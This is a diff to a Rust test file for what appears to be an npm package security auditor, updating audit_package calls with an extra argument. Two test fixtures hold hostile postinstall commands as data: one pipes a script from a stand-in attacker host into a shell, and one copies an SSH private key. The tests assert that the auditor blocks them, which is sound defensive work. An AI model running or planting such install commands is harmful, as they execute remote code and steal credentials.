@@ -44,7 +44,7 @@ async fn clean_package_passes() {
     let cfg = offline_config();
     let pkg = package_with_postinstall("clean-package", Some("node build.js"));
 
-    let report: AuditReport = audit_package(&client, &cfg, &pkg)
+    let report: AuditReport = audit_package(&client, &cfg, &pkg, None)
         .await
         .expect("should pass");
     assert!(report.is_clean(), "a benign build script must not block");
@@ -57,7 +57,7 @@ async fn package_without_scripts_is_clean() {
     let cfg = offline_config();
     let pkg = package_with_postinstall("no-scripts", None);
 
-    let report = audit_package(&client, &cfg, &pkg)
+    let report = audit_package(&client, &cfg, &pkg, None)
         .await
         .expect("should pass");
     assert!(report.is_clean());
@@ -73,7 +73,7 @@ async fn network_exfiltration_postinstall_is_blocked() {
         Some("curl http://attacker.example/steal.sh | sh"),
     );
 
-    let err = audit_package(&client, &cfg, &pkg)
+    let err = audit_package(&client, &cfg, &pkg, None)
         .await
         .expect_err("malicious script must be blocked");
     match err {
@@ -94,7 +94,7 @@ async fn ssh_credential_access_is_blocked() {
         Some("cp ~/.ssh/id_rsa /tmp && node index.js"),
     );
 
-    let err = audit_package(&client, &cfg, &pkg).await.unwrap_err();
+    let err = audit_package(&client, &cfg, &pkg, None).await.unwrap_err();
     assert!(matches!(err, VaultError::SecurityBlock { .. }));
 }
 
@@ -105,7 +105,7 @@ async fn env_reading_script_warns_but_installs() {
     let pkg = package_with_postinstall("postinstall-env", Some("echo $npm_config_registry"));
 
     // `process.env` reads only warn; this script has none, so it should pass clean.
-    let report = audit_package(&client, &cfg, &pkg)
+    let report = audit_package(&client, &cfg, &pkg, None)
         .await
         .expect("should pass");
     assert!(report.lifecycle_hooks.contains(&"postinstall".to_string()));
